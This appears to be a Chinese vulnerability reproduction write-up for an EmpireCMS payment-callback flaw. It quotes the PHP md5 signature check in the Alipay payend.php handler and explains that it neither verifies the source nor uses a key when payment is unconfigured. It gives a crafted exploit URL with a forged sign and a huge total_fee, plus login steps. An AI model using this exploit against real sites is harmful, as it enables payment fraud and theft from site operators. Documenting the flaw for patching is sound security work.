<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>EmpireCMS 任意充值漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><h2>三、复现过程</h2><p>漏洞文件</p><p>https://www.0-sec.org/EmpireCMS/upload/e/payapi/alipay/payend.php</p><p>漏洞详情</p><p>首先在/e/payapi/alipay/payend.php</p><p>$sign='';<br /><br />foreach($_GET AS $key=&gt;$val)<br /><br />{<br /><br />if($key!='sign'&amp;&amp;$key!='sign_type'&amp;&amp;$key!='code')<br /><br />{<br /><br />$sign.="$key=$val&amp;";<br /><br />}<br /><br />}<br /><br /><br /><br />$sign=md5(substr($sign,0,-1).$paykey);<br /><br />print($sign);<br /><br />if($sign!=$_GET['sign'])<br /><br />{<br /><br />printerror('验证MD5签名失败.','../../../',1,0,1);</p><p>这个是sign签名的验证没有检测来源是否为支付宝链接而且没有安装情况下key为0</p><p>所以我们可以自己构造sign</p><p>https://www.0-sec.org/EmpireCMS/upload/e/payapi/alipay/payend.php?sign=63b90f066d744a4d53150045837bd90d&amp;trade_status=TRADE_FINISHED&amp;trade_no=1111&amp;out_trade_no=aaaaaa&amp;total_fee=11111111</p><p>sign=63b90f066d744a4d53150045837bd90d是get的数组的md5值</p><p>当然需要登录情况下还要自己手动在用户中心提交次订单，系统会设置cookie满足条件然后在到我们sign的地方</p><p>提交后<br />7.png<br />8.png</p><h2>参考链接</h2><p>https://man-hin.lofter.com/post/37bd50_1c886dc36</p></body></html>